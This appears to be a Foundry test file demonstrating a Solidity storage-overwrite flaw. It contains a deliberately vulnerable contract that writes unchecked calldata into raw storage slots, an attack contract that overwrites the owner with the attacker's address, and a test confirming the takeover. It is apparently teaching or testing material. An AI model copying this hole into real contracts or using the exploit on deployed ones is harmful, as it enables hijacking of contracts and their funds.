// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract as per provided vulnerability
contract VulnerableContract {
    // 狀態變數：固定大小的 buffer，長度為 1，存放於 storage slot 0
    bytes32[1] public buffer;
    // 狀態變數：owner 存放於 storage slot 1
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // 漏洞重點：未檢查 _data 陣列輸入的長度，使用 assembly 直接寫入 storage
    function writeData(bytes32[] calldata _data) external {
        uint256 len = _data.length;
        for (uint256 i = 0; i < len; i++) {
            assembly {
                // 計算 storage position，此處不檢查 i 是否超出 buffer 大小
                // 第一個寫入將對應到 buffer[0] (slot 0), 第二個寫入將覆寫 owner (slot 1)
                let slot := i
                // 注意：calldataload 讀取 calldata 中 _data 的 i 項，32 字節一個元素
                sstore(slot, calldataload(add(_data.offset, mul(i, 32))))
            }
        }
    }
}

// 攻擊合約範例
contract Attack {
    VulnerableContract public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    function attack() public {
        // 製作一個長度為 2 的資料陣列
        bytes32[] memory maliciousData = new bytes32[](2);
        // 元素 0: 隨意資料
        maliciousData[0] = bytes32(uint256(0));
        // 元素 1: 以攻擊者的地址覆寫 owner (將 address 轉為 uint160 再轉 uint256, 最後轉 bytes32)
        maliciousData[1] = bytes32(uint256(uint160(msg.sender)));

        // 呼叫 vulnerable 合約寫入資料，透過 assembly 寫入過程覆蓋 owner
        vulnerable.writeData(maliciousData);
    }
}


// Foundry test demonstrating the buffer overflow vulnerability exploit
contract VulnerableContractTest is Test {
    VulnerableContract vulnerable;
    Attack attackerContract;
    address attacker = address(0x123);

    function setUp() public {
        // Deploy the VulnerableContract with test deployer as owner
        vulnerable = new VulnerableContract();
        // Deploy the Attack contract with reference to the VulnerableContract
        attackerContract = new Attack(address(vulnerable));
    }

    function testExploit() public {
        // Ensure that initially, the owner of the vulnerable contract is the deployer (this test contract)
        assertEq(vulnerable.owner(), address(this), "Initial owner should be deployer");

        // Simulate an attacker calling the attack function
        vm.prank(attacker);
        attackerContract.attack();

        // After the attack, the owner should have been overwritten to the attacker's address
        assertEq(vulnerable.owner(), attacker, "Owner should be overwritten to attacker address");
    }
}
